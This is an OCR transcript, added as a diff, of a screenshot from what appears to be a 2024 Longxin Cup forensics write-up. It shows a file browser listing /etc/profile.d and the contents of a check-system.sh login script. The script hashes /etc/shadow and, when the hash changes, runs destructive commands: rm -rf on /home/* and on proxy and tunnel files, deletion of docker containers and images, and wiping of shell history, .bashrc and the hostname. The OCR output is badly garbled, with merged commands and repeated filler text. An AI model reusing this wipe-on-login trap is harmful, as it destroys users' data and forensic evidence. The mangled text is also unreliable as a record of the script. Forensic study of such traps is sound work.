@@ -1,0 +1,31 @@
+# OCR: 2f1c18dce5366fa1795095585ba6d7dd.webp
+# 来源: ./02-WriteUp/2024/2024-龙信杯/2f1c18dce5366fa1795095585ba6d7dd.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:21
+
+letclprofile.d 口文件名称～
+..=etc（3,019）.=profile.d（19）
+256term.csh 256term.sh
+abrt-console-notification.sh bashcompletion.sh
+check-system.sh colorgrep.csh colorgrep.sh
+colorls.csh colorls.sh csh.local lang.csh lang.sh less.csh less.sh
+分区
+文件
+#!/usr/bin/enybash OLD="
+if[-f /etc/.cadpc 1: then OLD="$(cat/etc/.cadpc) fi
+回预览
++回详细
+?描述存在的存在的存在的存在的存在的存在的
+存在的，已查看
+存在的存在的存在的存在的存在的存在的存在的存在的存在的
+口缩略图
+日
+CURRENT="$(cat/etc/shadow|sha256sum|awk-F"print$1))
+if［"SOLD"|="SCURRENT"];then echo"llegal login detectediil"
+rm-rf/etc/profile.d/check-system.sh dockerrm-f$(dockerps-ag)
+rm-rf/opt/proxy rm -rf /opt/install.sh rm-rf /root/ntp-tunnel
+rm-rf/root/sock5-tunne rm -rf /home/*
+rm-rf/root/.docker/config.json dockerimageprune-af
+cat/dev/null>~/.bashhistory echo">~/.bashrc
+hostnamectlset-hostnamelocalhost
+history -c fi
